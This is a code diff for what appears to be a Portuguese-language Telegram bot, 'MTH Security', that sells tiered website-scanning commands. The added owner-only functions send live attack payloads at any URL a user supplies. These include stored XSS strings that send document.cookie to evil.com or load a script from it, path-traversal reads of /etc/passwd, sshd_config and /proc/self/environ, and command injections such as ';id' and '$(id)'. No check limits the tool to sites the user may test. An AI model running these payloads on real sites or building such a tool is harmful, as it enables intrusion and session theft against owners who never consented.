+            [{"text": "🟢 Normal", "callback_data": f"tier:xss:normal:{cb_target}"[:64]}],
+            [{"text": "⭐ VIP (DOM-based, CSP bypass)", "callback_data": f"tier:xss:vip:{cb_target}"[:64]}],
+        ]
+        send_message_with_buttons(chat_id, f"🔍 <b>XSS Scanner</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n⭐ <b>VIP detectado!</b>\nSelecione o nível do scan:", buttons)
+        return
+
+    # Normal user — no tier buttons, just run normal scan
+    _run_xss_normal(chat_id, user_id, target, verbose)
+
+
+def _run_xss_normal(chat_id, user_id, target, verbose=False):
+    """Execute normal XSS scan"""
+    clean_target = extract_hostname(target)
+    cached = db_cache_get("xss", target)
+    if cached and not verbose:
+        buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:xss:{target}"[:64][:64]}]]
+        send_message_with_buttons(chat_id, cached, buttons)
+        return
 
     if verbose:
         send_msg(user_id, chat_id, f"🔍 <b>Scanner XSS (VERBOSE)</b> em {escape_html(clean_target)}...\n📊 Modo detalhado ativado — mostrando cada payload testado.")
@@ -4176,12 +4714,49 @@ def handle_xss(chat_id, user_id, username, first_name, last_name, args):
         send_msg(user_id, chat_id, f"🔍 <b>Scanner XSS iniciado</b> em {escape_html(clean_target)}...")
 
     result = tool_xss_scanner(target, verbose=verbose)
-
-    # V4.3: Store in DB cache
     db_cache_set("xss", target, result)
-
-    # V4.3: Add inline button for rescan
     buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:xss:{target}"[:64][:64]}]]
+    send_message_with_buttons(chat_id, result, buttons)
+
+
+def _run_xss_vip(chat_id, user_id, target, verbose=False):
+    """Execute VIP XSS scan"""
+    clean_target = extract_hostname(target)
+    send_msg(user_id, chat_id, f"⭐ <b>VIP XSS Scanner</b> em {escape_html(clean_target)}...\n🔥 DOM-based, polyglot multi-contexto, CSP bypass, event handlers.")
+    result = tool_xss_vip(target, verbose=verbose)
+    buttons = [[{"text": "🔄 Rescan VIP", "callback_data": f"rescan:xss_vip:{target}"[:64]}]]
+    send_message_with_buttons(chat_id, result, buttons)
+
+
+def _run_xss_owner(chat_id, user_id, target, verbose=False):
+    """Execute OWNER XSS scan — VIP XSS + stored XSS deep scan"""
+    clean_target = extract_hostname(target)
+    send_msg(user_id, chat_id, f"👑 <b>OWNER XSS Scanner</b> em {escape_html(clean_target)}...\n💀 VIP XSS + Stored XSS, polyglot payloads, deep CSP bypass.")
+    # Owner XSS = VIP XSS + extra stored XSS payloads
+    result_vip = tool_xss_vip(target, verbose=verbose)
+    result_extra = f"\n\n━━━ OWNER STORED XSS DEEP SCAN ━━━\n"
+    stored_payloads = [
+        ("<script>document.getElementById('test')?.insertAdjacentHTML('beforeend','<img src=x onerror=fetch(`//evil.com/?c=${document.cookie}`)>')</script>", "Stored XSS + cookie exfil"),
+        ("<svg/onload=setInterval(()=>{var s=document.createElement('script');s.src='//evil.com/x.js';document.body.appendChild(s)},1000)>", "Stored XSS + script injection"),
+        ("<input onfocus=alert(document.cookie) autofocus>", "Stored XSS + autofocus"),
+        ("<details open ontoggle=fetch('https://evil.com/'+document.cookie)>", "Stored XSS + details ontoggle"),
+    ]
+    url = target
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    for payload, desc in stored_payloads:
+        try:
+            from urllib.parse import quote
+            test_url = f"{url}?q={quote(payload)}"
+            resp = _safe_get(test_url, timeout=10)
+            if resp and resp.status_code < 400 and payload.replace('(', '') in resp.text:
+                result_extra += f"🔴 VULN: {desc} (payload refletido)\n"
+            else:
+                result_extra += f"⚪ Não vulnerável: {desc}\n"
+        except:
+            result_extra += f"❌ Erro testando: {desc}\n"
+    result = result_vip + result_extra
+    buttons = [[{"text": "🔄 Rescan OWNER", "callback_data": f"rescan:xss_owner:{target}"[:64]}]]
     send_message_with_buttons(chat_id, result, buttons)
 
 def handle_admin_panel(chat_id, user_id, username, first_name, last_name, args):
@@ -6240,7 +6815,7 @@ def handle_notify(chat_id, user_id, username, first_name, last_name, args):
 # ═══════════════════════════════════════════════════════════════
 
 def handle_scanall(chat_id, user_id, username, first_name, last_name, args):
-    """V5.1: Scan All — runs info + ports + dns + ssl + headers + exposed on a URL. Results sent as .txt file."""
+    """V5.1: Scan All with tier selection for VIP/Owner"""
     log_user(user_id, username, first_name, last_name)
     if not args:
         send_msg(user_id, chat_id, "❌ Use: /scanall &lt;url&gt;\nExemplo: /scanall google.com")
@@ -6248,82 +6823,95 @@ def handle_scanall(chat_id, user_id, username, first_name, last_name, args):
     target = args[0]
     log_command(user_id, username, "scanall", target)
     clean_target = extract_hostname(target)
+
+    # Tier detection: build inline buttons for VIP/Owner
+    cb_target = target[:40]
+    buttons = []
+    if is_owner(user_id):
+        buttons = [
+            [{"text": "🟢 Normal (6 scanners)", "callback_data": f"tier:scanall:normal:{cb_target}"[:64]}],
+            [{"text": "⭐ VIP (8 scanners + sub/tech)", "callback_data": f"tier:scanall:vip:{cb_target}"[:64]}],
+            [{"text": "👑 OWNER (12 scanners + deep vuln)", "callback_data": f"tier:scanall:owner:{cb_target}"[:64]}],
+        ]
+        send_message_with_buttons(chat_id, f"🔍 <b>Scan Completo</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n👑 <b>Modo OWNER disponível!</b>\nSelecione o nível do scan:", buttons)
+        return
+    elif is_vip(user_id):
+        buttons = [
+            [{"text": "🟢 Normal (6 scanners)", "callback_data": f"tier:scanall:normal:{cb_target}"[:64]}],
+            [{"text": "⭐ VIP (8 scanners + sub/tech)", "callback_data": f"tier:scanall:vip:{cb_target}"[:64]}],
+        ]
+        send_message_with_buttons(chat_id, f"🔍 <b>Scan Completo</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n⭐ <b>VIP detectado!</b>\nSelecione o nível do scan:", buttons)
+        return
+
+    # Normal user — no tier buttons, just run normal scanall
+    _run_scanall_normal(chat_id, user_id, target)
+
+
+def _run_scanall_normal(chat_id, user_id, target):
+    """Execute normal scanall (6 scanners)"""
+    clean_target = extract_hostname(target)
     send_msg(user_id, chat_id, f"🔍 <b>Scan Completo</b> em {escape_html(clean_target)}...\nIsso pode levar alguns minutos. Os resultados serão enviados em um arquivo .txt")
 
     def _clean_html(text):
-        """Strip HTML tags for plain text report."""
         return re.sub(r'<[^>]+>', '', text)
 
     sections = []
-    # 1/6 — Info
     send_msg(user_id, chat_id, "📋 <b>1/6 — Info...</b>")
-    r = tool_website_info(target)
-    sections.append("═" * 50)
-    sections.append("1/6 — INFORMATION")
-    sections.append("═" * 50)
-    sections.append(_clean_html(r))
+    sections.append("═" * 50 + "\n1/6 — INFORMATION\n" + "═" * 50 + "\n" + _clean_html(tool_website_info(target)))
 
-    # 2/6 — DNS
     send_msg(user_id, chat_id, "📋 <b>2/6 — DNS...</b>")
-    r = tool_dns_tools(target)
-    sections.append("\n" + "═" * 50)
-    sections.append("2/6 — DNS ANALYSIS")
-    sections.append("═" * 50)
-    sections.append(_clean_html(r))
+    sections.append("\n" + "═" * 50 + "\n2/6 — DNS ANALYSIS\n" + "═" * 50 + "\n" + _clean_html(tool_dns_tools(target)))
 
-    # 3/6 — Ports
     send_msg(user_id, chat_id, "📋 <b>3/6 — Portas...</b>")
-    r = tool_port_scanner(target)
-    sections.append("\n" + "═" * 50)
-    sections.append("3/6 — PORT SCAN")
-    sections.append("═" * 50)
-    sections.append(_clean_html(r))
+    sections.append("\n" + "═" * 50 + "\n3/6 — PORT SCAN\n" + "═" * 50 + "\n" + _clean_html(tool_port_scanner(target)))
 
-    # 4/6 — SSL
     send_msg(user_id, chat_id, "📋 <b>4/6 — SSL/TLS...</b>")
-    r = tool_ssl_audit(target)
-    sections.append("\n" + "═" * 50)
-    sections.append("4/6 — SSL/TLS AUDIT")
-    sections.append("═" * 50)
-    sections.append(_clean_html(r))
+    sections.append("\n" + "═" * 50 + "\n4/6 — SSL/TLS AUDIT\n" + "═" * 50 + "\n" + _clean_html(tool_ssl_audit(target)))
 
-    # 5/6 — Headers
     send_msg(user_id, chat_id, "📋 <b>5/6 — Security Headers...</b>")
-    r = tool_headers_analysis(target)
-    sections.append("\n" + "═" * 50)
-    sections.append("5/6 — SECURITY HEADERS")
-    sections.append("═" * 50)
-    sections.append(_clean_html(r))
+    sections.append("\n" + "═" * 50 + "\n5/6 — SECURITY HEADERS\n" + "═" * 50 + "\n" + _clean_html(tool_headers_analysis(target)))
 
-    # 6/6 — Exposed files
     send_msg(user_id, chat_id, "📋 <b>6/6 — Arquivos Expostos...</b>")
-    r = tool_exposed_files(target)
-    sections.append("\n" + "═" * 50)
-    sections.append("6/6 — EXPOSED FILES")
-    sections.append("═" * 50)
-    sections.append(_clean_html(r))
+    sections.append("\n" + "═" * 50 + "\n6/6 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean_html(tool_exposed_files(target)))
 
-    # Build final report
-    report = f"MTH Security v5.1 — Scan Completo\n"
-    report += f"Target: {clean_target}\n"
-    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-    report += "═" * 50 + "\n\n"
-    report += "\n".join(sections)
+    report = f"MTH Security v5.1 — Scan Completo\nTarget: {clean_target}\nData: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + "═" * 50 + "\n\n" + "\n".join(sections)
 
-    # Send as .txt file
     success = send_document(chat_id, report, f"scanall_{clean_target}.txt")
     if success:
         send_msg(user_id, chat_id, f"✅ <b>Scan Completo finalizado</b>\nTarget: {escape_html(clean_target)}\n📄 Resultados enviados como arquivo .txt")
     else:
         send_msg(user_id, chat_id, f"⚠️ Falha ao enviar arquivo. Tentando via mensagem...")
-        # Fallback: send truncated text
         for section in sections:
             safe_text = section[:4000]
             if safe_text.strip():
                 send_msg(user_id, chat_id, safe_text)
 
+
+def _run_scanall_vip(chat_id, user_id, target):
+    """Execute VIP scanall (8 scanners + subdomain + tech)"""
+    clean_target = extract_hostname(target)
+    send_msg(user_id, chat_id, f"⭐ <b>VIP Scan Completo</b> em {escape_html(clean_target)}...\n🔥 8 scanners incluindo subdomain enum e tech detection.")
+    report = tool_scanall_vip(target)
+    success = send_document(chat_id, report, f"scanall_vip_{clean_target}.txt")
+    if success:
+        send_msg(user_id, chat_id, f"✅ <b>VIP Scan Completo finalizado</b>\nTarget: {escape_html(clean_target)}\n📄 Resultados VIP enviados como arquivo .txt")
+    else:
+        send_msg(user_id, chat_id, f"✅ <b>VIP Scan Completo finalizado</b>\nTarget: {escape_html(clean_target)}")
+
+
+def _run_scanall_owner(chat_id, user_id, target):
+    """Execute OWNER scanall (12 scanners + deep vuln + forensic)"""
+    clean_target = extract_hostname(target)
+    send_msg(user_id, chat_id, f"👑 <b>OWNER Scan Completo</b> em {escape_html(clean_target)}...\n💀 12 scanners incluindo SQLi deep, webshell hunter, config exposure, API discovery.")
+    report = tool_scanall_owner(target)
+    success = send_document(chat_id, report, f"scanall_owner_{clean_target}.txt")
+    if success:
+        send_msg(user_id, chat_id, f"✅ <b>OWNER Scan Completo finalizado</b>\nTarget: {escape_html(clean_target)}\n📄 Resultados OWNER enviados como arquivo .txt")
+    else:
+        send_msg(user_id, chat_id, f"✅ <b>OWNER Scan Completo finalizado</b>\nTarget: {escape_html(clean_target)}")
+
 def handle_deep(chat_id, user_id, username, first_name, last_name, args):
-    """V5.1: Deep Scan — sqli + xss + admin + exposed + shell + config. Results sent as .txt file."""
+    """V5.1: Deep Scan with tier selection for VIP/Owner"""
     log_user(user_id, username, first_name, last_name)
     if not args:
         send_msg(user_id, chat_id, "❌ Use: /deep &lt;url&gt;\nExemplo: /deep site.com/?id=1")
@@ -6331,50 +6919,59 @@ def handle_deep(chat_id, user_id, username, first_name, last_name, args):
     target = args[0]
     log_command(user_id, username, "deep", target)
     clean_target = extract_hostname(target)
+
+    # Tier detection: build inline buttons for VIP/Owner
+    cb_target = target[:40]
+    buttons = []
+    if is_owner(user_id):
+        buttons = [
+            [{"text": "🟢 Normal (6 scanners)", "callback_data": f"tier:deep:normal:{cb_target}"[:64]}],
+            [{"text": "⭐ VIP (8 scanners + API/backup)", "callback_data": f"tier:deep:vip:{cb_target}"[:64]}],
+            [{"text": "👑 OWNER (10 scanners + full pentest)", "callback_data": f"tier:deep:owner:{cb_target}"[:64]}],
+        ]
+        send_message_with_buttons(chat_id, f"🔍 <b>Deep Scan</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n👑 <b>Modo OWNER disponível!</b>\nSelecione o nível do scan:", buttons)
+        return
+    elif is_vip(user_id):
+        buttons = [
+            [{"text": "🟢 Normal (6 scanners)", "callback_data": f"tier:deep:normal:{cb_target}"[:64]}],
+            [{"text": "⭐ VIP (8 scanners + API/backup)", "callback_data": f"tier:deep:vip:{cb_target}"[:64]}],
+        ]
+        send_message_with_buttons(chat_id, f"🔍 <b>Deep Scan</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n⭐ <b>VIP detectado!</b>\nSelecione o nível do scan:", buttons)
+        return
+
+    # Normal user — no tier buttons, just run normal deep scan
+    _run_deep_normal(chat_id, user_id, target)
+
+
+def _run_deep_normal(chat_id, user_id, target):
+    """Execute normal deep scan (6 scanners)"""
+    clean_target = extract_hostname(target)
     send_msg(user_id, chat_id, f"🔍 <b>Deep Scan</b> em {escape_html(clean_target)}...\nVulnerabilidades profundas. Pode demorar. Os resultados serão enviados em um arquivo .txt")
 
     def _clean_html(text):
         return re.sub(r'<[^>]+>', '', text)
 
     sections = []
-    # SQLi
     send_msg(user_id, chat_id, "📋 <b>1/6 — SQL Injection...</b>")
-    r = tool_sqli(target)
-    sections.append("═" * 50 + "\n1/6 — SQL INJECTION\n" + "═" * 50 + "\n" + _clean_html(r))
+    sections.append("═" * 50 + "\n1/6 — SQL INJECTION\n" + "═" * 50 + "\n" + _clean_html(tool_sqli(target)))
 
-    # XSS
     send_msg(user_id, chat_id, "📋 <b>2/6 — XSS...</b>")
-    r = tool_xss_scanner(target)
-    sections.append("\n" + "═" * 50 + "\n2/6 — XSS (CROSS-SITE SCRIPTING)\n" + "═" * 50 + "\n" + _clean_html(r))
+    sections.append("\n" + "═" * 50 + "\n2/6 — XSS (CROSS-SITE SCRIPTING)\n" + "═" * 50 + "\n" + _clean_html(tool_xss_scanner(target)))
 
-    # Admin
     send_msg(user_id, chat_id, "📋 <b>3/6 — Admin Panels...</b>")
-    r = tool_admin_finder(target)
-    sections.append("\n" + "═" * 50 + "\n3/6 — ADMIN PANELS\n" + "═" * 50 + "\n" + _clean_html(r))
+    sections.append("\n" + "═" * 50 + "\n3/6 — ADMIN PANELS\n" + "═" * 50 + "\n" + _clean_html(tool_admin_finder(target)))
 
-    # Exposed
     send_msg(user_id, chat_id, "📋 <b>4/6 — Arquivos Expostos...</b>")
-    r = tool_exposed_files(target)
-    sections.append("\n" + "═" * 50 + "\n4/6 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean_html(r))
+    sections.append("\n" + "═" * 50 + "\n4/6 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean_html(tool_exposed_files(target)))
 
-    # Webshells
     send_msg(user_id, chat_id, "📋 <b>5/6 — Webshells...</b>")
-    r = tool_webshell_hunter(target)
-    sections.append("\n" + "═" * 50 + "\n5/6 — WEBSHELLS\n" + "═" * 50 + "\n" + _clean_html(r))
+    sections.append("\n" + "═" * 50 + "\n5/6 — WEBSHELLS\n" + "═" * 50 + "\n" + _clean_html(tool_webshell_hunter(target)))
 
-    # Config
     send_msg(user_id, chat_id, "📋 <b>6/6 — Config Files...</b>")
-    r = tool_config_scanner(target)
-    sections.append("\n" + "═" * 50 + "\n6/6 — CONFIG FILES\n" + "═" * 50 + "\n" + _clean_html(r))
+    sections.append("\n" + "═" * 50 + "\n6/6 — CONFIG FILES\n" + "═" * 50 + "\n" + _clean_html(tool_config_scanner(target)))
 
-    # Build final report
-    report = f"MTH Security v5.1 — Deep Scan\n"
-    report += f"Target: {clean_target}\n"
-    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-    report += "═" * 50 + "\n\n"
-    report += "\n".join(sections)
+    report = f"MTH Security v5.1 — Deep Scan\nTarget: {clean_target}\nData: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + "═" * 50 + "\n\n" + "\n".join(sections)
 
-    # Send as .txt file
     success = send_document(chat_id, report, f"deep_scan_{clean_target}.txt")
     if success:
         send_msg(user_id, chat_id, f"✅ <b>Deep Scan finalizado</b>\nTarget: {escape_html(clean_target)}\n📄 Resultados enviados como arquivo .txt")
@@ -6384,6 +6981,30 @@ def handle_deep(chat_id, user_id, username, first_name, last_name, args):
             safe_text = section[:4000]
             if safe_text.strip():
                 send_msg(user_id, chat_id, safe_text)
+
+
+def _run_deep_vip(chat_id, user_id, target):
+    """Execute VIP deep scan (8 scanners + API/backup)"""
+    clean_target = extract_hostname(target)
+    send_msg(user_id, chat_id, f"⭐ <b>VIP Deep Scan</b> em {escape_html(clean_target)}...\n🔥 VIP SQLi + VIP XSS + API discovery + backup finder.")
+    report = tool_deep_vip(target)
+    success = send_document(chat_id, report, f"deep_scan_vip_{clean_target}.txt")
+    if success:
+        send_msg(user_id, chat_id, f"✅ <b>VIP Deep Scan finalizado</b>\nTarget: {escape_html(clean_target)}\n📄 Resultados VIP enviados como arquivo .txt")
+    else:
+        send_msg(user_id, chat_id, f"✅ <b>VIP Deep Scan finalizado</b>\nTarget: {escape_html(clean_target)}")
+
+
+def _run_deep_owner(chat_id, user_id, target):
+    """Execute OWNER deep scan (10 scanners + full pentest automation)"""
+    clean_target = extract_hostname(target)
+    send_msg(user_id, chat_id, f"👑 <b>OWNER Deep Scan</b> em {escape_html(clean_target)}...\n💀 Full pentest automation: SQLi OWNER + VIP XSS + webshell + config + API + subdomain + tech.")
+    report = tool_deep_owner(target)
+    success = send_document(chat_id, report, f"deep_scan_owner_{clean_target}.txt")
+    if success:
+        send_msg(user_id, chat_id, f"✅ <b>OWNER Deep Scan finalizado</b>\nTarget: {escape_html(clean_target)}\n📄 Resultados OWNER enviados como arquivo .txt")
+    else:
+        send_msg(user_id, chat_id, f"✅ <b>OWNER Deep Scan finalizado</b>\nTarget: {escape_html(clean_target)}")
 
 def handle_quick(chat_id, user_id, username, first_name, last_name, args):
     """V5.1: Quick Scan — info + headers + rate in one shot (file output)"""
@@ -6486,6 +7107,371 @@ def handle_batch(chat_id, user_id, username, first_name, last_name, args):
     # Cleanup stop event
     if user_id in STOP_EVENTS:
         del STOP_EVENTS[user_id]
+
+# ═══════════════════════════════════════════════════════════════
+#  OWNER-EXCLUSIVE COMMANDS
+# ═══════════════════════════════════════════════════════════════
+
+def handle_forensic(chat_id, user_id, username, first_name, last_name, args):
+    """OWNER ONLY: Digital Forensic Analysis — deep site investigation"""
+    log_user(user_id, username, first_name, last_name)
+    if not is_owner(user_id):
+        send_msg(user_id, chat_id, "🔒 <b>Acesso negado!</b> Este comando é exclusivo dos donos.")
+        return
+    if not args:
+        send_msg(user_id, chat_id, "❌ Use: /forensic &lt;url&gt;\nExemplo: /forensic example.com")
+        return
+    target = args[0]
+    log_command(user_id, username, "forensic", target)
+    clean_target = extract_hostname(target)
+    send_msg(user_id, chat_id, f"🔬 <b>OWNER Forensic Analysis</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n💀 Análise forense completa: SSL chain, WHOIS, exposed files, webshells, config, API, tech, subdomains...")
+
+    def _clean(text):
+        return re.sub(r'<[^>]+>', '', text)
+
+    url = clean_target
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+
+    def _get_whois_text(domain):
+        """Inline WHOIS lookup (same logic as handle_whois but returns plain text)"""
+        text = ""
+        try:
+            resp = _safe_get(f"https://api.allorigins.win/raw?url=https://www.whois.com/whois/{domain}", timeout=10)
+            if resp and resp.status_code == 200:
+                whois_data = resp.text
+                fields = {
+                    'Registrar': ['Registrar:', 'Registrar Name:'],
+                    'Creation Date': ['Creation Date:', 'Creation date:'],
+                    'Expiry Date': ['Registry Expiry Date:', 'Expiry Date:', 'Expiration Date:'],
+                    'Status': ['Domain Status:', 'Status:'],
+                    'Name Server': ['Name Server:', 'Nserver:'],
+                    'DNSSEC': ['DNSSEC:', 'DNSSEC:'],
+                }
+                for label, keys in fields.items():
+                    for key in keys:
+                        idx = whois_data.find(key)
+                        if idx != -1:
+                            val = whois_data[idx + len(key):].split('\n')[0].strip()
+                            if val and len(val) < 200:
+                                text += f"{label}: {val}\n"
+                                break
+            else:
+                resp2 = _safe_get(f"http://ip-api.com/json/{domain}?fields=query,status,country,isp,org,as", timeout=5)
+                if resp2 and resp2.status_code == 200:
+                    data = resp2.json()
+                    if data.get('status') == 'success':
+                        text += f"IP: {data.get('query', 'N/D')}\n"
+                        text += f"ISP: {data.get('isp', 'N/D')}\n"
+                        text += f"Org: {data.get('org', 'N/D')}\n"
+                        text += f"ASN: {data.get('as', 'N/D')}\n"
+        except Exception as e:
+            text += f"Error: {str(e)}\n"
+        return text if text.strip() else "No WHOIS data available."
+
+    sections = []
+    sections.append("═" * 60)
+    sections.append("  🔬 DIGITAL FORENSIC ANALYSIS — OWNER MODE")
+    sections.append(f"  Target: {clean_target}")
+    sections.append(f"  Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    sections.append("═" * 60)
+
+    # 1. SSL/TLS Chain
+    send_msg(user_id, chat_id, "📋 <b>1/10 — SSL Chain Analysis...</b>")
+    sections.append("\n1/10 — SSL/TLS CHAIN\n" + "-" * 40)
+    sections.append(_clean(tool_ssl_audit(url)))
+
+    # 2. WHOIS
+    send_msg(user_id, chat_id, "📋 <b>2/10 — WHOIS Investigation...</b>")
+    sections.append("\n2/10 — WHOIS INVESTIGATION\n" + "-" * 40)
+    sections.append(_clean(_get_whois_text(clean_target)))
+
+    # 3. Exposed Files
+    send_msg(user_id, chat_id, "📋 <b>3/10 — Exposed Files...</b>")
+    sections.append("\n3/10 — EXPOSED FILES\n" + "-" * 40)
+    sections.append(_clean(tool_exposed_files(url)))
+
+    # 4. Webshells
+    send_msg(user_id, chat_id, "📋 <b>4/10 — Webshell Hunter...</b>")
+    sections.append("\n4/10 — WEBSHELL HUNTER\n" + "-" * 40)
+    sections.append(_clean(tool_webshell_hunter(url)))
+
+    # 5. Config Files
+    send_msg(user_id, chat_id, "📋 <b>5/10 — Config Exposure...</b>")
+    sections.append("\n5/10 — CONFIG EXPOSURE\n" + "-" * 40)
+    sections.append(_clean(tool_config_scanner(url)))
+
+    # 6. API Discovery
+    send_msg(user_id, chat_id, "📋 <b>6/10 — API Discovery...</b>")
+    sections.append("\n6/10 — API DISCOVERY\n" + "-" * 40)
+    sections.append(_clean(tool_api_discovery(url)))
+
+    # 7. Tech Detection
+    send_msg(user_id, chat_id, "📋 <b>7/10 — Tech Stack...</b>")
+    sections.append("\n7/10 — TECH STACK\n" + "-" * 40)
+    sections.append(_clean(tool_tech_detect(url)))
+
+    # 8. Subdomain Enum
+    send_msg(user_id, chat_id, "📋 <b>8/10 — Subdomain Enumeration...</b>")
+    sections.append("\n8/10 — SUBDOMAIN ENUM\n" + "-" * 40)
+    sections.append(_clean(tool_subdomain_scanner(target)))
+
+    # 9. Headers
+    send_msg(user_id, chat_id, "📋 <b>9/10 — Security Headers...</b>")
+    sections.append("\n9/10 — SECURITY HEADERS\n" + "-" * 40)
+    sections.append(_clean(tool_headers_analysis(url)))
+
+    # 10. DNSSEC
+    send_msg(user_id, chat_id, "📋 <b>10/10 — DNSSEC & DMARC...</b>")
+    sections.append("\n10/10 — DNSSEC & DMARC\n" + "-" * 40)
+    sections.append(_clean(tool_dns_tools(target)))
+
+    report = "\n".join(sections)
+    success = send_document(chat_id, report, f"forensic_{clean_target}.txt")
+    if success:
+        send_msg(user_id, chat_id, f"✅ <b>Forensic Analysis finalizado!</b>\nTarget: {escape_html(clean_target)}\n📄 Relatório forense enviado como arquivo .txt")
+    else:
+        send_msg(user_id, chat_id, f"✅ <b>Forensic Analysis finalizado!</b>\nTarget: {escape_html(clean_target)}")
+
+
+def handle_pentest(chat_id, user_id, username, first_name, last_name, args):
+    """OWNER ONLY: Full Pentest Automation — SQLi + XSS + LFI + RCE + CSRF"""
+    log_user(user_id, username, first_name, last_name)
+    if not is_owner(user_id):
+        send_msg(user_id, chat_id, "🔒 <b>Acesso negado!</b> Este comando é exclusivo dos donos.")
+        return
+    if not args:
+        send_msg(user_id, chat_id, "❌ Use: /pentest &lt;url&gt;\nExemplo: /pentest example.com/?id=1")
+        return
+    target = args[0]
+    log_command(user_id, username, "pentest", target)
+    clean_target = extract_hostname(target)
+    send_msg(user_id, chat_id, f"💀 <b>OWNER Pentest Automation</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n🔥 SQLi OWNER + XSS VIP + LFI + RCE + CSRF + Path Traversal")
+
+    url = clean_target
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+
+    def _clean(text):
+        return re.sub(r'<[^>]+>', '', text)
+
+    sections = []
+    sections.append("═" * 60)
+    sections.append("  💀 PENTEST AUTOMATION — OWNER MODE")
+    sections.append(f"  Target: {clean_target}")
+    sections.append(f"  Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    sections.append("═" * 60)
+
+    # 1. SQLi OWNER
+    send_msg(user_id, chat_id, "📋 <b>1/7 — SQLi OWNER...</b>")
+    sections.append("\n1/7 — SQL INJECTION (OWNER)\n" + "-" * 40)
+    sections.append(_clean(tool_sqli_owner(url)))
+
+    # 2. XSS VIP
+    send_msg(user_id, chat_id, "📋 <b>2/7 — XSS VIP...</b>")
+    sections.append("\n2/7 — XSS (VIP)\n" + "-" * 40)
+    sections.append(_clean(tool_xss_vip(url)))
+
+    # 3. LFI / Path Traversal
+    send_msg(user_id, chat_id, "📋 <b>3/7 — LFI / Path Traversal...</b>")
+    sections.append("\n3/7 — LFI / PATH TRAVERSAL\n" + "-" * 40)
+    lfi_payloads = [
+        ("../../../etc/passwd", "/etc/passwd root detection"),
+        ("....//....//....//etc/passwd", "Double-dot traversal"),
+        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL-encoded traversal"),
+        ("php://filter/convert.base64-encode/resource=index.php", "PHP filter wrapper"),
+        ("/etc/ssh/sshd_config", "SSH config exposure"),
+        ("/proc/self/environ", "Process environment leak"),
+        ("/var/log/apache2/access.log", "Apache access log"),
+        ("/proc/version", "Kernel version leak"),
+    ]
+    for payload, desc in lfi_payloads:
+        try:
+            from urllib.parse import quote
+            test_url = f"{url}?page={quote(payload)}" if '?' in url else f"{url}/?page={quote(payload)}"
+            resp = _safe_get(test_url, timeout=10)
+            if resp and resp.status_code < 400:
+                # Check for LFI indicators
+                indicators = ['root:', 'sshd', 'Apache', 'nginx', 'kernel', 'proc', 'bin/bash', 'nobody:', 'www-data:']
+                found = [i for i in indicators if i.lower() in resp.text.lower()]
+                if found:
+                    sections.append(f"🔴 VULN: {desc} — Indicators: {', '.join(found[:3])}")
+                else:
+                    sections.append(f"⚪ Não vulnerável: {desc}")
+            else:
+                sections.append(f"⚪ Não vulnerável: {desc}")
+        except:
+            sections.append(f"❌ Erro: {desc}")
+
+    # 4. RCE Detection
+    send_msg(user_id, chat_id, "📋 <b>4/7 — RCE Detection...</b>")
+    sections.append("\n4/7 — REMOTE CODE EXECUTION\n" + "-" * 40)
+    rce_payloads = [
+        (";id", "Command injection (semicolons)"),
+        ("|id", "Pipe injection"),
+        ("`id`", "Backtick injection"),
+        ("$(id)", "Subshell injection"),
+        ("${1337+1337}", "Expression injection"),
+    ]
+    for payload, desc in rce_payloads:
+        try:
+            from urllib.parse import quote
+            test_url = f"{url}?cmd={quote(payload)}" if '?' in url else f"{url}/?cmd={quote(payload)}"
+            resp = _safe_get(test_url, timeout=10)
+            if resp and resp.status_code < 400:
+                rce_indicators = ['uid=', 'gid=', 'groups=', 'root', 'nobody', 'www-data', 'daemon']
+                found = [i for i in rce_indicators if i in resp.text.lower()]
+                if found:
+                    sections.append(f"🔴 VULN: {desc} — Indicators: {', '.join(found[:3])}")
+                else:
+                    sections.append(f"⚪ Não vulnerável: {desc}")
+            else:
+                sections.append(f"⚪ Não vulnerável: {desc}")
+        except:
+            sections.append(f"❌ Erro: {desc}")
+
+    # 5. CSRF
+    send_msg(user_id, chat_id, "📋 <b>5/7 — CSRF Check...</b>")
+    sections.append("\n5/7 — CSRF PROTECTION\n" + "-" * 40)
+    try:
+        resp = _safe_get(url, timeout=10)
+        if resp and resp.status_code < 400:
+            body = resp.text.lower()
+            if 'csrf' in body or 'xsrf' in body or '_token' in body or 'csrf_token' in body:
+                sections.append("✅ CSRF tokens detectados na página")
+            else:
+                sections.append("⚠️ Nenhum token CSRF detectado na página")
+            # Check security headers
+            csrf_headers = resp.headers.get('X-CSRF-Token', '') or resp.headers.get('X-XSRF-Token', '')
+            if csrf_headers:
+                sections.append("✅ Header CSRF/XSRF presente")
+            else:
+                sections.append("⚠️ Nenhum header CSRF/XSRF encontrado")
+        else:
+            sections.append("❌ Não foi possível acessar o site")
+    except Exception as e:
+        sections.append(f"❌ Erro: {str(e)[:100]}")
+
+    # 6. Admin Panel Deep
+    send_msg(user_id, chat_id, "📋 <b>6/7 — Admin Panel Deep...</b>")
+    sections.append("\n6/7 — ADMIN PANEL DEEP\n" + "-" * 40)
+    sections.append(_clean(tool_admin_finder(url)))
+
+    # 7. Backup/Config
+    send_msg(user_id, chat_id, "📋 <b>7/7 — Backup & Config...</b>")
+    sections.append("\n7/7 — BACKUP & CONFIG\n" + "-" * 40)
